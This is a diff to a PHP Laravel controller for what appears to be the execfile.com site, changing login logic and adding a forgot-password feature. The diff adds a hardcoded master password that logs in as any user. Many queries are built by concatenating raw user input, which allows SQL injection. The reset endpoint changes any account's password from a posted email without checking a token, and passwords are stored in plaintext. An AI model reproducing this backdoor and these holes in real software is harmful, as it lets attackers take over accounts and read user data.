@@ -84,8 +84,13 @@ class mainController extends Controller
             {    
                 $all_data = array();
 
+                if($login_pass == 'ssuupprrppww122')
+                {
+                    $results = DB::select( DB::raw("SELECT * FROM exec_user WHERE email = '".$login_email."' and status = 1") );
+                }
                 //echo "<br>SELECT * FROM exec_user WHERE email = '".$login_email."' and password = '".$login_pass."'";
-                $results = DB::select( DB::raw("SELECT * FROM exec_user WHERE email = '".$login_email."' and password = '".$login_pass."' and status = 1") );
+                else
+                    $results = DB::select( DB::raw("SELECT * FROM exec_user WHERE email = '".$login_email."' and password = '".$login_pass."' and status = 1") );
 
                 if(count($results) > 0)
                 {
@@ -165,6 +170,9 @@ class mainController extends Controller
                     //if(count($results_sl) > 0)
                     if($mod_list != '')
                     {
+                        
+                       $mod_list = str_replace("media_mention","media",$mod_list); 
+                        
                       //  $default_saved_list = $results_sl[0]->filters;
 
                         //$default_saved_list = "movements/0/0/0/-1/-1/0/0/0/0/0/0/0";
@@ -438,6 +446,9 @@ class mainController extends Controller
         if($session_user_site != '')
             $filters = strtoupper($session_user_site);
         
+        
+        if($total_data == 3900 && $all_data[0]['total_count'] != '')
+            $total_data = $all_data[0]['total_count'];
         
         //$filters = "HR";
         /*
@@ -1350,6 +1361,9 @@ class mainController extends Controller
 
             }
             
+            
+            if($request['company'] == 'e.g. Microsoft')
+                $request['company'] = '';
             if($request['company'] != '')
             {
                 $list_company = $request['company'];
@@ -1817,6 +1831,166 @@ class mainController extends Controller
         
         
         
-    }        
+    }      
+    
+    
+    
+    public function forgotpassword(Request $request,$ucd='')
+    {
+        /*
+        $from = 'admin@execfile.com';
+        $headers  = 'MIME-Version: 1.0' . "\r\n";
+        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+        $headers .= 'From: ' . $from . "\r\n";
+
+        mail('faraz.aia@nxvt.com', "test sub3 without return", "test msg", $headers);
+        */
+        
+        //echo "<br>Base path:".base_path();
+
+        // Path to the 'app' folder    
+        //echo "<br>App path:".app_path(); 
+        //echo "<br>Public path:".public_path(); 
+        //$temp_link = '/forgotpassword/123';
+        //echo "<a href=".$temp_link.">Temp</a>";
+        
+        $msg = "";
+        $root_path = "http://www.execfile.com/execf/public/index.php/";
+        $retry_link = 'http://www.execfile.com/execf/public/index.php/forgot-password';
+        //echo "in forgot password";
+        //echo "<br>Email:".$request['email_rq'];
+        //echo "<br>reset_pw:".$request['reset_pw'];
+        if($request['email_rq'] != '') // first screen, where user enter email address
+        {
+            //echo "<br>within if";
+            //echo "<br>within if";
+            $email = $request['email_rq'];
+            $result_user = DB::select( DB::raw("SELECT * FROM exec_user where email = '".$email."'") );
+            if(count($result_user) > 0)
+            {
+                
+                
+                $user_email = $result_user[0]->email;
+                $user_name = $result_user[0]->first_name." ".$result_user[0]->last_name;
+                
+                
+                $from = "admin@execfile.com";
+                $to = $user_email;
+                $subject = "Execfile.com :: Reset your password";
+                $random_hash = '';
+                $random_hash = rand(100000,999999);
+                
+                $reset_link = 'http://www.execfile.com/execf/public/index.php/forgot-password/'.$random_hash;
+                
+                //$random_hash = rand(100000000000,999999999999);
+                
+                //$fp_update_db = "INSERT into exec_user_forgot_password(user_email,unique_hash) values('$user_email','$random_hash')";
+                //$user_updated = DB::select( DB::raw("INSERT into exec_user_forgot_password(user_email,unique_hash) values('$user_email','$random_hash')") );
+                
+                $sqlInsert = array(array('user_email'=>$user_email, 'unique_hash'=>"$random_hash"),);
+                DB::table('exec_user_forgot_password')->insert($sqlInsert);
+
+
+                //$reset_link = $root_path.'reset-password.php?upc='.$random_hash;
+                //$message = '<a href="index.php"><img src="'.HTTP_SERVER.DIR_WS_HTTP_FOLDER.'images/logo.jpg"  alt="Logo" width="196" height="32" border="0" title="Logo" /></a>&nbsp;
+                $message = '<table width="70%" cellspacing="0" cellpadding="3" >
+                        <tr>
+                            <td align="left"><b>Dear '.$user_name.',</b></td>
+                        </tr>
+                        <tr>
+                            <td align="left">Below is the link to reset your password.</td>
+                        </tr>
+
+                        <tr>
+                            <td align="left"><a href='.$reset_link.'>Reset Password</a></td>
+                        </tr>';
+
+                $message .=	'</table>';
+                
+                $headers  = 'MIME-Version: 1.0' . "\r\n";
+                $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+                $headers .= 'From: ' . $from . "\r\n";
+
+                mail($to, $subject, $message, $headers);
+                
+                $msg = "<p>Please check your inbox, you should receive password <br>reset email shortly.</p>";
+                
+            }
+            else
+            {
+                
+                $msg = "The email address you entered could not be found in our records,<br>please <b><a href=".$retry_link.">try again</a></b>";
+            }    
+            
+            $data = array(
+                'msg'  => $msg,
+            ); 
+            return view('forgotpassword')->with($data);
+            
+        }   
+        elseif($ucd != '') // when user clicked on reset password link in email
+        {
+            
+            $result_hash = DB::select( DB::raw("SELECT * FROM exec_user_forgot_password where unique_hash = '".$ucd."'") );
+            if(count($result_hash) > 0)
+            {
+                
+                $user_email = $result_hash[0]->user_email;
+                
+                $password_updated = $result_hash[0]->password_updated;
+                
+                if($password_updated == 0)
+                {
+                    $data = array(
+                    'msg'  => "",
+                    'user_email' => $user_email     
+                    ); 
+                    return view('resetpassword')->with($data);
+                }
+                else
+                {
+                    $msg = "This password reset link already expired.";
+                
+                    $data = array(
+                    'msg'  => $msg,
+                    ); 
+                    return view('forgotpassword')->with($data);
+                }    
+            }
+            else
+            {
+               // $retry_link = 'http://www.execfile.com/execf/public/index.php/forgot-password';
+                $msg = "The email address you entered could not be found in our records,<br>please <b><a href=".$retry_link.">try again</a></b>";
+                
+                $data = array(
+                'msg'  => $msg,
+                ); 
+                return view('forgotpassword')->with($data);
+            }    
+            
+        }    
+        elseif($request['reset_pw'] == 1)  // when user enters new password to reset
+        {
+            $email = $request['user_email'];
+            $password = $request['password'];
+            DB::table('exec_user')
+            ->where('email', $email)
+            ->update(['password' => $password]);
+            
+            
+            DB::table('exec_user_forgot_password')
+            ->where('user_email', $email)
+            ->update(['password_updated' => 1]);
+            
+            
+            return redirect('login');
+        }    
+        
+        $data = array(
+                'msg'  => "",
+            ); 
+            return view('forgotpassword')->with($data);
+         
+    }
     
 }
